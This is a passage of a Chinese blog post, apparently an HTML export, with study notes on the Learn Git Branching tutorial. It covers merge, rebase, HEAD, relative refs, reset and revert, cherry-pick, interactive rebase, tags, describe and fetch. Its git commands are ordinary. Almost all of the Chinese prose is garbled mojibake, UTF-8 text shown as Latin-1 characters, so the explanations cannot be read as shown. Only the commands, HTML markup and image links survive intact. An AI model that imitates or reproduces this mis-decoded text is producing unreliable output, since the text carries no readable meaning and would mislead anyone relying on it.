æˆå‚¨å­˜æˆ–å†…å­˜ä¸Šçš„å¼€é”€ï¼Œå¹¶ä¸”æŒ‰é€»è¾‘åˆ†è§£å·¥ä½œåˆ°ä¸åŒçš„åˆ†æ”¯è¦æ¯”ç»´æŠ¤é‚£äº›ç‰¹åˆ«è‡ƒè‚¿çš„åˆ†æ”¯ç®€å•å¤šäº†ã€‚</p><p>åœ¨å°†åˆ†æ”¯å’Œæäº¤è®°å½•ç»“åˆèµ·æ¥åï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸¤è€…å¦‚ä½•åä½œã€‚ç°åœ¨åªè¦è®°ä½ä½¿ç”¨åˆ†æ”¯å…¶å®å°±ç›¸å½“äºåœ¨è¯´ï¼šâ€œæˆ‘æƒ³åŸºäºè¿™ä¸ªæäº¤ä»¥åŠå®ƒæ‰€æœ‰çš„çˆ¶æäº¤è¿›è¡Œæ–°çš„å·¥ä½œã€‚â€</p><p>ä½¿ç”¨<code>git checkout &lt;name&gt;</code>æ¥åˆ‡æ¢åˆ†æ”¯</p><p>å¦‚æœä½ æƒ³åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯åŒæ—¶åˆ‡æ¢åˆ°æ–°åˆ›å»ºçš„åˆ†æ”¯çš„è¯ï¼Œå¯ä»¥é€šè¿‡ <code>git checkout -b &lt;your-branch-name&gt;</code>æ¥å®ç°ã€‚</p><h3 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h3><p>åœ¨ Git ä¸­åˆå¹¶ä¸¤ä¸ªåˆ†æ”¯æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªç‰¹æ®Šçš„æäº¤è®°å½•ï¼Œå®ƒæœ‰ä¸¤ä¸ªçˆ¶èŠ‚ç‚¹ã€‚ç¿»è¯‘æˆè‡ªç„¶è¯­è¨€ç›¸å½“äºï¼šâ€œæˆ‘è¦æŠŠè¿™ä¸¤ä¸ªçˆ¶èŠ‚ç‚¹æœ¬èº«åŠå®ƒä»¬æ‰€æœ‰çš„ç¥–å…ˆéƒ½åŒ…å«è¿›æ¥ã€‚â€</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/2614D1E0-BD73-48F8-B8DB-5F6CEC905F80.png" alt="192ba280fae5ee0fd1f909cff39ead77"></p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/F58D8E70-4B17-41AA-8742-FD472E1BF94A.png" alt="b26c0aefbbee442bf750ce2f01eae6de"></p><h3 id="Git-Rebase"><a href="#Git-Rebase" class="headerlink" title="Git Rebase"></a>Git Rebase</h3><p>Rebase å®é™…ä¸Šå°±æ˜¯å–å‡ºä¸€ç³»åˆ—çš„æäº¤è®°å½•ï¼Œâ€œå¤åˆ¶â€å®ƒä»¬ï¼Œç„¶ååœ¨å¦å¤–ä¸€ä¸ªåœ°æ–¹é€ä¸ªçš„æ”¾ä¸‹å»ã€‚</p><p>Rebase çš„ä¼˜åŠ¿å°±æ˜¯å¯ä»¥åˆ›é€ æ›´çº¿æ€§çš„æäº¤å†å²ï¼Œè¿™å¬ä¸Šå»æœ‰äº›éš¾ä»¥ç†è§£ã€‚å¦‚æœåªå…è®¸ä½¿ç”¨ Rebase çš„è¯ï¼Œä»£ç åº“çš„æäº¤å†å²å°†ä¼šå˜å¾—å¼‚å¸¸æ¸…æ™°ã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/50EA88DF-1C3E-41D1-9840-4E7A01090760.png" alt="18515be24c4a725919c1b94c7a72f606"></p><h2 id="0x02-é«˜çº§ç¯‡"><a href="#0x02-é«˜çº§ç¯‡" class="headerlink" title="0x02 é«˜çº§ç¯‡"></a>0x02 é«˜çº§ç¯‡</h2><h3 id="åˆ†ç¦»HEAD"><a href="#åˆ†ç¦»HEAD" class="headerlink" title="åˆ†ç¦»HEAD"></a>åˆ†ç¦»HEAD</h3><p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹ â€œHEADâ€ã€‚ HEAD æ˜¯ä¸€ä¸ªå¯¹å½“å‰æ£€å‡ºè®°å½•çš„ç¬¦å·å¼•ç”¨ â€”â€” ä¹Ÿå°±æ˜¯æŒ‡å‘ä½ æ­£åœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œå·¥ä½œçš„æäº¤è®°å½•ã€‚</p><p>HEAD æ€»æ˜¯æŒ‡å‘å½“å‰åˆ†æ”¯ä¸Šæœ€è¿‘ä¸€æ¬¡æäº¤è®°å½•ã€‚å¤§å¤šæ•°ä¿®æ”¹æäº¤æ ‘çš„ Git å‘½ä»¤éƒ½æ˜¯ä»æ”¹å˜ HEAD çš„æŒ‡å‘å¼€å§‹çš„ã€‚</p><p>HEAD é€šå¸¸æƒ…å†µä¸‹æ˜¯æŒ‡å‘åˆ†æ”¯åçš„ï¼ˆå¦‚ bugFixï¼‰ã€‚åœ¨ä½ æäº¤æ—¶ï¼Œæ”¹å˜äº† bugFix çš„çŠ¶æ€ï¼Œè¿™ä¸€å˜åŒ–é€šè¿‡ HEAD å˜å¾—å¯è§ã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/9069213E-F9CD-4FC8-9E74-0B8F0B75A0AA.png" alt="fd0e97c8eaad7c0bb5a6c7c278765c8e"></p><h3 id="ç›¸å¯¹å¼•ç”¨"><a href="#ç›¸å¯¹å¼•ç”¨" class="headerlink" title="ç›¸å¯¹å¼•ç”¨"></a>ç›¸å¯¹å¼•ç”¨</h3><p>é€šè¿‡æŒ‡å®šæäº¤è®°å½•å“ˆå¸Œå€¼çš„æ–¹å¼åœ¨ Git ä¸­ç§»åŠ¨ä¸å¤ªæ–¹ä¾¿ã€‚åœ¨å®é™…åº”ç”¨æ—¶ï¼Œå¹¶æ²¡æœ‰åƒæœ¬ç¨‹åºä¸­è¿™ä¹ˆæ¼‚äº®çš„å¯è§†åŒ–æäº¤æ ‘ä¾›ä½ å‚è€ƒï¼Œæ‰€ä»¥ä½ å°±ä¸å¾—ä¸ç”¨ git log æ¥æŸ¥æŸ¥çœ‹æäº¤è®°å½•çš„å“ˆå¸Œå€¼ã€‚</p><p>å¹¶ä¸”å“ˆå¸Œå€¼åœ¨çœŸå®çš„ Git ä¸–ç•Œä¸­ä¹Ÿä¼šæ›´é•¿ï¼ˆè¯‘è€…æ³¨ï¼šåŸºäº SHA-1ï¼Œå…± 40 ä½ï¼‰ã€‚ä¾‹å¦‚å‰ä¸€å…³çš„ä»‹ç»ä¸­çš„æäº¤è®°å½•çš„å“ˆå¸Œå€¼å¯èƒ½æ˜¯ fed2da64c0efc5293610bdd892f82a58e8cbc5d8ã€‚èˆŒå¤´éƒ½å¿«æ‰“ç»“äº†å§â€¦</p><p>æ¯”è¾ƒä»¤äººæ¬£æ…°çš„æ˜¯ï¼ŒGit å¯¹å“ˆå¸Œçš„å¤„ç†å¾ˆæ™ºèƒ½ã€‚ä½ åªéœ€è¦æä¾›èƒ½å¤Ÿå”¯ä¸€æ ‡è¯†æäº¤è®°å½•çš„å‰å‡ ä¸ªå­—ç¬¦å³å¯ã€‚å› æ­¤æˆ‘å¯ä»¥ä»…è¾“å…¥fed2 è€Œä¸æ˜¯ä¸Šé¢çš„ä¸€é•¿ä¸²å­—ç¬¦ã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/8F832134-D7A6-46C5-9C19-B2F4E27DE7E1.png" alt="82ea783ee879c7e317d6c81361dead95"></p><p>â€œ~â€æ“ä½œç¬¦<br>å¦‚æœä½ æƒ³åœ¨æäº¤æ ‘ä¸­å‘ä¸Šç§»åŠ¨å¾ˆå¤šæ­¥çš„è¯ï¼Œæ•²é‚£ä¹ˆå¤š ^ è²Œä¼¼ä¹ŸæŒºçƒ¦äººçš„ï¼ŒGit å½“ç„¶ä¹Ÿè€ƒè™‘åˆ°äº†è¿™ä¸€ç‚¹ï¼Œäºæ˜¯åˆå¼•å…¥äº†æ“ä½œç¬¦ ~ã€‚</p><p>è¯¥æ“ä½œç¬¦åé¢å¯ä»¥è·Ÿä¸€ä¸ªæ•°å­—ï¼ˆå¯é€‰ï¼Œä¸è·Ÿæ•°å­—æ—¶ä¸ ^ ç›¸åŒï¼Œå‘ä¸Šç§»åŠ¨ä¸€æ¬¡ï¼‰ï¼ŒæŒ‡å®šå‘ä¸Šç§»åŠ¨å¤šå°‘æ¬¡ã€‚å’±ä»¬è¿˜æ˜¯é€šè¿‡å®é™…æ“ä½œçœ‹ä¸€ä¸‹å§</p><p><strong>å¼ºåˆ¶ä¿®æ”¹åˆ†æ”¯ä½ç½®</strong><br>ä½ ç°åœ¨æ˜¯ç›¸å¯¹å¼•ç”¨çš„ä¸“å®¶äº†ï¼Œç°åœ¨ç”¨å®ƒæ¥åšç‚¹å®é™…äº‹æƒ…ã€‚</p><p>æˆ‘ä½¿ç”¨ç›¸å¯¹å¼•ç”¨æœ€å¤šçš„å°±æ˜¯ç§»åŠ¨åˆ†æ”¯ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨ -f é€‰é¡¹è®©åˆ†æ”¯æŒ‡å‘å¦ä¸€ä¸ªæäº¤ã€‚ä¾‹å¦‚:</p><p>git branch -f master HEAD~3</p><p>ä¸Šé¢çš„å‘½ä»¤ä¼šå°† master åˆ†æ”¯å¼ºåˆ¶æŒ‡å‘ HEAD çš„ç¬¬ 3 çº§çˆ¶æäº¤ã€‚<br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/4509FB0F-B67C-4FF9-BE10-99E53FD8D771.png" alt="f447b9a4564b33261cea73e6216e7c4f"></p><p>è¿™å…³çš„ç»ƒä¹ æŒºæœ‰æ„æ€çš„ahhh</p><h3 id="æ’¤é”€å˜æ›´"><a href="#æ’¤é”€å˜æ›´" class="headerlink" title="æ’¤é”€å˜æ›´"></a>æ’¤é”€å˜æ›´</h3><p>åœ¨ Git é‡Œæ’¤é”€å˜æ›´çš„æ–¹æ³•å¾ˆå¤šã€‚å’Œæäº¤ä¸€æ ·ï¼Œæ’¤é”€å˜æ›´ç”±åº•å±‚éƒ¨åˆ†ï¼ˆæš‚å­˜åŒºçš„ç‹¬ç«‹æ–‡ä»¶æˆ–è€…ç‰‡æ®µï¼‰å’Œä¸Šå±‚éƒ¨åˆ†ï¼ˆå˜æ›´åˆ°åº•æ˜¯é€šè¿‡å“ªç§æ–¹å¼è¢«æ’¤é”€çš„ï¼‰ç»„æˆã€‚æˆ‘ä»¬è¿™ä¸ªåº”ç”¨ä¸»è¦å…³æ³¨çš„æ˜¯åè€…ã€‚</p><p>ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ç”¨æ¥æ’¤é”€å˜æ›´ â€”â€” ä¸€æ˜¯ git resetï¼Œè¿˜æœ‰å°±æ˜¯ git revertã€‚æ¥ä¸‹æ¥å’±ä»¬é€ä¸ªè¿›è¡Œè®²è§£ã€‚<br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/77F0A047-20D3-4C7D-9717-A3B7FAB89413.png" alt="d99d76d8f5424fcd99266252dd643b2f"></p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/E58FC9EC-1CE9-4CA9-9659-BB89197E199D.png" alt="bb4a48b09f3d4801500a97b02668e17d"></p><h2 id="0x03-ç§»åŠ¨æäº¤è®°å½•"><a href="#0x03-ç§»åŠ¨æäº¤è®°å½•" class="headerlink" title="0x03 ç§»åŠ¨æäº¤è®°å½•"></a>0x03 ç§»åŠ¨æäº¤è®°å½•</h2><h3 id="Git-Cherry-pick"><a href="#Git-Cherry-pick" class="headerlink" title="Git Cherry-pick"></a>Git Cherry-pick</h3><p>æœ¬ç³»åˆ—çš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ git cherry-pick, å‘½ä»¤å½¢å¼ä¸º:</p><p>git cherry-pick &lt;æäº¤å·&gt;â€¦<br>å¦‚æœä½ æƒ³å°†ä¸€äº›æäº¤å¤åˆ¶åˆ°å½“å‰æ‰€åœ¨çš„ä½ç½®ï¼ˆHEADï¼‰ä¸‹é¢çš„è¯ï¼Œ Cherry-pick æ˜¯æœ€ç›´æ¥çš„æ–¹å¼äº†ã€‚æˆ‘ä¸ªäººéå¸¸å–œæ¬¢ cherry-pickï¼Œå› ä¸ºå®ƒç‰¹åˆ«ç®€å•ã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/3359DD9A-B71C-469C-9D30-045C734CCA6E.png" alt="765027cb3d5707374b46492489d40950"></p><h3 id="äº¤äº’å¼çš„-rebase"><a href="#äº¤äº’å¼çš„-rebase" class="headerlink" title="äº¤äº’å¼çš„ rebase"></a>äº¤äº’å¼çš„ rebase</h3><p>å½“ä½ çŸ¥é“ä½ æ‰€éœ€è¦çš„æäº¤è®°å½•ï¼ˆå¹¶ä¸”è¿˜çŸ¥é“è¿™äº›æäº¤è®°å½•çš„å“ˆå¸Œå€¼ï¼‰æ—¶, ç”¨ cherry-pick å†å¥½ä¸è¿‡äº† â€”â€” æ²¡æœ‰æ¯”è¿™æ›´ç®€å•çš„æ–¹å¼äº†ã€‚</p><p>ä½†æ˜¯å¦‚æœä½ ä¸æ¸…æ¥šä½ æƒ³è¦çš„æäº¤è®°å½•çš„å“ˆå¸Œå€¼å‘¢? å¹¸å¥½ Git å¸®ä½ æƒ³åˆ°äº†è¿™ä¸€ç‚¹, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨äº¤äº’å¼çš„ rebase â€”â€” å¦‚æœä½ æƒ³ä»ä¸€ç³»åˆ—çš„æäº¤è®°å½•ä¸­æ‰¾åˆ°æƒ³è¦çš„è®°å½•, è¿™å°±æ˜¯æœ€å¥½çš„æ–¹æ³•äº†</p><p>äº¤äº’å¼ rebase æŒ‡çš„æ˜¯ä½¿ç”¨å¸¦å‚æ•° â€“interactive çš„ rebase å‘½ä»¤, ç®€å†™ä¸º -i</p><p>å¦‚æœä½ åœ¨å‘½ä»¤åå¢åŠ äº†è¿™ä¸ªé€‰é¡¹, Git ä¼šæ‰“å¼€ä¸€ä¸ª UI ç•Œé¢å¹¶åˆ—å‡ºå°†è¦è¢«å¤åˆ¶åˆ°ç›®æ ‡åˆ†æ”¯çš„å¤‡é€‰æäº¤è®°å½•ï¼Œå®ƒè¿˜ä¼šæ˜¾ç¤ºæ¯ä¸ªæäº¤è®°å½•çš„å“ˆå¸Œå€¼å’Œæäº¤è¯´æ˜ï¼Œæäº¤è¯´æ˜æœ‰åŠ©äºä½ ç†è§£è¿™ä¸ªæäº¤è¿›è¡Œäº†å“ªäº›æ›´æ”¹ã€‚</p><p>åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œæ‰€è°“çš„ UI çª—å£ä¸€èˆ¬ä¼šåœ¨æ–‡æœ¬ç¼–è¾‘å™¨ â€”â€” å¦‚ Vim â€”â€” ä¸­æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ã€‚ è€ƒè™‘åˆ°è¯¾ç¨‹çš„åˆè¡·ï¼Œæˆ‘å¼„äº†ä¸€ä¸ªå¯¹è¯æ¡†æ¥æ¨¡æ‹Ÿè¿™äº›æ“ä½œã€‚</p><p>å½“ rebase UIç•Œé¢æ‰“å¼€æ—¶, ä½ èƒ½åš3ä»¶äº‹:</p><p>è°ƒæ•´æäº¤è®°å½•çš„é¡ºåºï¼ˆé€šè¿‡é¼ æ ‡æ‹–æ”¾æ¥å®Œæˆï¼‰<br>åˆ é™¤ä½ ä¸æƒ³è¦çš„æäº¤ï¼ˆé€šè¿‡åˆ‡æ¢ pick çš„çŠ¶æ€æ¥å®Œæˆï¼Œå…³é—­å°±æ„å‘³ç€ä½ ä¸æƒ³è¦è¿™ä¸ªæäº¤è®°å½•ï¼‰<br>åˆå¹¶æäº¤ã€‚ é—æ†¾çš„æ˜¯ç”±äºæŸç§é€»è¾‘çš„åŸå› ï¼Œæˆ‘ä»¬çš„è¯¾ç¨‹ä¸æ”¯æŒæ­¤åŠŸèƒ½ï¼Œå› æ­¤æˆ‘ä¸ä¼šè¯¦ç»†ä»‹ç»è¿™ä¸ªæ“ä½œã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå…è®¸ä½ æŠŠå¤šä¸ªæäº¤è®°å½•åˆå¹¶æˆä¸€ä¸ªã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/34362025-526B-46E4-BE18-2AA3F840D1DA.png" alt="e36004deb440e13f039d11d45f914336"></p><h2 id="0x04-æ‚é¡¹"><a href="#0x04-æ‚é¡¹" class="headerlink" title="0x04 æ‚é¡¹"></a>0x04 æ‚é¡¹</h2><h3 id="æœ¬åœ°æ ˆå¼æäº¤"><a href="#æœ¬åœ°æ ˆå¼æäº¤" class="headerlink" title="æœ¬åœ°æ ˆå¼æäº¤"></a>æœ¬åœ°æ ˆå¼æäº¤</h3><p>çœ‹ä¸€ä¸ªåœ¨å¼€å‘ä¸­ç»å¸¸ä¼šé‡åˆ°çš„æƒ…å†µï¼šæˆ‘æ­£åœ¨è§£å†³æŸä¸ªç‰¹åˆ«æ£˜æ‰‹çš„ Bugï¼Œä¸ºäº†ä¾¿äºè°ƒè¯•è€Œåœ¨ä»£ç ä¸­æ·»åŠ äº†ä¸€äº›è°ƒè¯•å‘½ä»¤å¹¶å‘æ§åˆ¶å°æ‰“å°äº†ä¸€äº›ä¿¡æ¯ã€‚</p><p>è¿™äº›è°ƒè¯•å’Œæ‰“å°è¯­å¥éƒ½åœ¨å®ƒä»¬å„è‡ªçš„æäº¤è®°å½•é‡Œã€‚æœ€åæˆ‘ç»ˆäºæ‰¾åˆ°äº†é€ æˆè¿™ä¸ª Bug çš„æ ¹æœ¬åŸå› ï¼Œè§£å†³æ‰ä»¥åè§‰å¾—æ²¾æ²¾è‡ªå–œï¼</p><p>æœ€åå°±å·®æŠŠ bugFix åˆ†æ”¯é‡Œçš„å·¥ä½œåˆå¹¶å› master åˆ†æ”¯äº†ã€‚ä½ å¯ä»¥é€‰æ‹©é€šè¿‡ fast-forward å¿«é€Ÿåˆå¹¶åˆ° master åˆ†æ”¯ä¸Šï¼Œä½†è¿™æ ·çš„è¯ master åˆ†æ”¯å°±ä¼šåŒ…å«æˆ‘è¿™äº›è°ƒè¯•è¯­å¥äº†ã€‚ä½ è‚¯å®šä¸æƒ³è¿™æ ·ï¼Œåº”è¯¥è¿˜æœ‰æ›´å¥½çš„æ–¹å¼â€¦â€¦</p><p>å®é™…æˆ‘ä»¬åªè¦è®© Git å¤åˆ¶è§£å†³é—®é¢˜çš„é‚£ä¸€ä¸ªæäº¤è®°å½•å°±å¯ä»¥äº†ã€‚è·Ÿä¹‹å‰æˆ‘ä»¬åœ¨â€œæ•´ç†æäº¤è®°å½•â€ä¸­å­¦åˆ°çš„ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i</span><br><span class="line">git cherry-pick</span><br></pre></td></tr></table></figure><p>æ¥è¾¾åˆ°ç›®çš„ã€‚</p><h3 id="æäº¤çš„æŠ€å·§-1"><a href="#æäº¤çš„æŠ€å·§-1" class="headerlink" title="æäº¤çš„æŠ€å·§ #1"></a>æäº¤çš„æŠ€å·§ #1</h3><p>æ¥ä¸‹æ¥è¿™ç§æƒ…å†µä¹Ÿæ˜¯å¾ˆå¸¸è§çš„ï¼šä½ ä¹‹å‰åœ¨ newImage åˆ†æ”¯ä¸Šè¿›è¡Œäº†ä¸€æ¬¡æäº¤ï¼Œç„¶ååˆåŸºäºå®ƒåˆ›å»ºäº† caption åˆ†æ”¯ï¼Œç„¶ååˆæäº¤äº†ä¸€æ¬¡ã€‚</p><p>æ­¤æ—¶ä½ æƒ³å¯¹çš„æŸä¸ªä»¥å‰çš„æäº¤è®°å½•è¿›è¡Œä¸€äº›å°å°çš„è°ƒæ•´ã€‚æ¯”å¦‚è®¾è®¡å¸ˆæƒ³ä¿®æ”¹ä¸€ä¸‹ newImage ä¸­å›¾ç‰‡çš„åˆ†è¾¨ç‡ï¼Œå°½ç®¡é‚£ä¸ªæäº¤è®°å½•å¹¶ä¸æ˜¯æœ€æ–°çš„äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•æ¥å…‹æœå›°éš¾ï¼š</p><ul><li>å…ˆç”¨ git rebase -i å°†æäº¤é‡æ–°æ’åºï¼Œç„¶åæŠŠæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„æäº¤è®°å½•æŒªåˆ°æœ€å‰</li><li>ç„¶åç”¨ commit â€“amend æ¥è¿›è¡Œä¸€äº›å°ä¿®æ”¹</li><li>æ¥ç€å†ç”¨ git rebase -i æ¥å°†ä»–ä»¬è°ƒå›åŸæ¥çš„é¡ºåº</li><li>æœ€åæˆ‘ä»¬æŠŠ master ç§»åˆ°ä¿®æ”¹çš„æœ€å‰ç«¯ï¼ˆç”¨ä½ è‡ªå·±å–œæ¬¢çš„æ–¹æ³•ï¼‰ï¼Œå°±å¤§åŠŸå‘Šæˆå•¦ï¼</li></ul><p>å½“ç„¶å®Œæˆè¿™ä¸ªä»»åŠ¡çš„æ–¹æ³•ä¸æ­¢ä¸Šé¢æåˆ°çš„ä¸€ç§ï¼ˆæˆ‘çŸ¥é“ä½ åœ¨çœ‹ cherry-pick å•¦ï¼‰ï¼Œä¹‹åæˆ‘ä»¬ä¼šå¤šç‚¹å…³æ³¨è¿™äº›æŠ€å·§å•¦ï¼Œä½†ç°åœ¨æš‚æ—¶åªä¸“æ³¨ä¸Šé¢è¿™ç§æ–¹æ³•ã€‚ æœ€åæœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹ç›®æ ‡çŠ¶æ€ä¸­çš„é‚£å‡ ä¸ª<code>&#39;</code> â€”â€” æˆ‘ä»¬æŠŠè¿™ä¸ªæäº¤ç§»åŠ¨äº†ä¸¤æ¬¡ï¼Œæ¯ç§»åŠ¨ä¸€æ¬¡ä¼šäº§ç”Ÿä¸€ä¸ª <code>&#39;</code>ï¼›è€Œ C2 ä¸Šå¤šå‡ºæ¥çš„é‚£ä¸ªæ˜¯æˆ‘ä»¬åœ¨ä½¿ç”¨äº† amend å‚æ•°æäº¤æ—¶äº§ç”Ÿçš„ï¼Œæ‰€ä»¥æœ€ç»ˆç»“æœå°±æ˜¯è¿™æ ·äº†ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘åœ¨å¯¹æ¯”ç»“æœçš„æ—¶å€™åªä¼šå¯¹æ¯”æäº¤æ ‘çš„ç»“æ„ï¼Œå¯¹äº <code>&#39;</code> çš„æ•°é‡ä¸Šçš„ä¸åŒï¼Œå¹¶ä¸çº³å…¥å¯¹æ¯”èŒƒå›´å†…ã€‚åªè¦ä½ çš„ master åˆ†æ”¯ç»“æ„ä¸ç›®æ ‡ç»“æ„ç›¸åŒï¼Œæˆ‘å°±ç®—ä½ é€šè¿‡ã€‚</p><h3 id="æäº¤çš„æŠ€å·§-2"><a href="#æäº¤çš„æŠ€å·§-2" class="headerlink" title="æäº¤çš„æŠ€å·§ #2"></a>æäº¤çš„æŠ€å·§ #2</h3><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/9E5623EC-E5BF-4769-BF07-C5CDE2AA2E85.png" alt="3989b7b8ec9346ac016e0b0359f9b2ed"></p><p>ä½¿ç”¨cherry-pickè€Œä¸æ˜¯rebase</p><h3 id="Git-Tags"><a href="#Git-Tags" class="headerlink" title="Git Tags"></a>Git Tags</h3><p>ç›¸ä¿¡é€šè¿‡å‰é¢è¯¾ç¨‹çš„å­¦ä¹ ä½ å·²ç»å‘ç°äº†ï¼šåˆ†æ”¯å¾ˆå®¹æ˜“è¢«äººä¸ºç§»åŠ¨ï¼Œå¹¶ä¸”å½“æœ‰æ–°çš„æäº¤æ—¶ï¼Œå®ƒä¹Ÿä¼šç§»åŠ¨ã€‚åˆ†æ”¯å¾ˆå®¹æ˜“è¢«æ”¹å˜ï¼Œå¤§éƒ¨åˆ†åˆ†æ”¯è¿˜åªæ˜¯ä¸´æ—¶çš„ï¼Œå¹¶ä¸”è¿˜ä¸€ç›´åœ¨å˜ã€‚</p><p>ä½ å¯èƒ½ä¼šé—®äº†ï¼šæœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ°¸è¿œæŒ‡å‘æŸä¸ªæäº¤è®°å½•çš„æ ‡è¯†å‘¢ï¼Œæ¯”å¦‚è½¯ä»¶å‘å¸ƒæ–°çš„å¤§ç‰ˆæœ¬ï¼Œæˆ–è€…æ˜¯ä¿®æ­£ä¸€äº›é‡è¦çš„ Bug æˆ–æ˜¯å¢åŠ äº†æŸäº›æ–°ç‰¹æ€§ï¼Œæœ‰æ²¡æœ‰æ¯”åˆ†æ”¯æ›´å¥½çš„å¯ä»¥æ°¸è¿œæŒ‡å‘è¿™äº›æäº¤çš„æ–¹æ³•å‘¢ï¼Ÿ</p><p>å½“ç„¶æœ‰äº†ï¼Git çš„ tag å°±æ˜¯å¹²è¿™ä¸ªç”¨çš„å•Šï¼Œå®ƒä»¬å¯ä»¥ï¼ˆåœ¨æŸç§ç¨‹åº¦ä¸Š â€”â€” å› ä¸ºæ ‡ç­¾å¯ä»¥è¢«åˆ é™¤åé‡æ–°åœ¨å¦å¤–ä¸€ä¸ªä½ç½®åˆ›å»ºåŒåçš„æ ‡ç­¾ï¼‰æ°¸ä¹…åœ°å°†æŸä¸ªç‰¹å®šçš„æäº¤å‘½åä¸ºé‡Œç¨‹ç¢‘ï¼Œç„¶åå°±å¯ä»¥åƒåˆ†æ”¯ä¸€æ ·å¼•ç”¨äº†ã€‚</p><p>æ›´éš¾å¾—çš„æ˜¯ï¼Œå®ƒä»¬å¹¶ä¸ä¼šéšç€æ–°çš„æäº¤è€Œç§»åŠ¨ã€‚ä½ ä¹Ÿä¸èƒ½æ£€å‡ºåˆ°æŸä¸ªæ ‡ç­¾ä¸Šé¢è¿›è¡Œä¿®æ”¹æäº¤ï¼Œå®ƒå°±åƒæ˜¯æäº¤æ ‘ä¸Šçš„ä¸€ä¸ªé”šç‚¹ï¼Œæ ‡è¯†äº†æŸä¸ªç‰¹å®šçš„ä½ç½®ã€‚</p><p>å’±ä»¬æ¥çœ‹çœ‹æ ‡ç­¾åˆ°åº•æ˜¯ä»€ä¹ˆæ ·ã€‚<br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/09E6A8B9-6BF9-4C0C-8285-CD2EA66D021A.png" alt="eda9f37cda3db0a78b41231c2c106bb9"></p><h3 id="Git-Describe"><a href="#Git-Describe" class="headerlink" title="Git Describe"></a>Git Describe</h3><p>ç”±äºæ ‡ç­¾åœ¨ä»£ç åº“ä¸­èµ·ç€â€œé”šç‚¹â€çš„ä½œç”¨ï¼ŒGit è¿˜ä¸ºæ­¤ä¸“é—¨è®¾è®¡äº†ä¸€ä¸ªå‘½ä»¤ç”¨æ¥æè¿°ç¦»ä½ æœ€è¿‘çš„é”šç‚¹ï¼ˆä¹Ÿå°±æ˜¯æ ‡ç­¾ï¼‰ï¼Œå®ƒå°±æ˜¯ <code>git describe</code>ï¼</p><p><code>Git Describe</code> èƒ½å¸®ä½ åœ¨æäº¤å†å²ä¸­ç§»åŠ¨äº†å¤šæ¬¡ä»¥åæ‰¾åˆ°æ–¹å‘ï¼›å½“ä½ ç”¨ <code>git bisect</code>ï¼ˆä¸€ä¸ªæŸ¥æ‰¾äº§ç”Ÿ Bug çš„æäº¤è®°å½•çš„æŒ‡ä»¤ï¼‰æ‰¾åˆ°æŸä¸ªæäº¤è®°å½•æ—¶ï¼Œæˆ–è€…æ˜¯å½“ä½ ååœ¨ä½ é‚£åˆšåˆšåº¦å‡å›æ¥çš„åŒäº‹çš„ç”µè„‘å‰æ—¶ï¼Œ å¯èƒ½ä¼šç”¨åˆ°è¿™ä¸ªå‘½ä»¤ã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/A9CEE6D3-F067-4268-BF36-8AA2776538E0.png" alt="699894efdfa9040cca48ef0c1cfebc34"><br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/FDF8C289-B2B6-4D18-BABE-AF2B8F6BA68F.png" alt="c477de5a3f6e9599613d42c8625ab11d"></p><h2 id="0x05-Remote"><a href="#0x05-Remote" class="headerlink" title="0x05 Remote"></a>0x05 Remote</h2><h3 id="Git-clone"><a href="#Git-clone" class="headerlink" title="Git clone"></a>Git clone</h3><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/BD9DC00A-8D6E-4F17-89DB-29FEB666B559.png" alt="a95080721b1c67d1f457af6e19d8cbc0"></p><h3 id="Git-Fetch"><a href="#Git-Fetch" class="headerlink" title="Git Fetch"></a>Git Fetch</h3><p>Git è¿œç¨‹ä»“åº“ç›¸å½“çš„æ“ä½œå®é™…å¯ä»¥å½’çº³ä¸ºä¸¤ç‚¹ï¼šå‘è¿œç¨‹ä»“åº“ä¼ è¾“æ•°æ®ä»¥åŠä»è¿œç¨‹ä»“åº“è·å–æ•°æ®ã€‚æ—¢ç„¶æˆ‘ä»¬èƒ½ä¸è¿œç¨‹ä»“åº“åŒæ­¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ†äº«ä»»ä½•èƒ½è¢« Git ç®¡ç†çš„æ›´æ–°ï¼ˆå› æ­¤å¯ä»¥åˆ†äº«ä»£ç ã€æ–‡ä»¶ã€æƒ³æ³•ã€æƒ…ä¹¦ç­‰ç­‰ï¼‰ã€‚</p><p>æœ¬èŠ‚è¯¾æˆ‘ä»¬å°†å­¦ä¹ 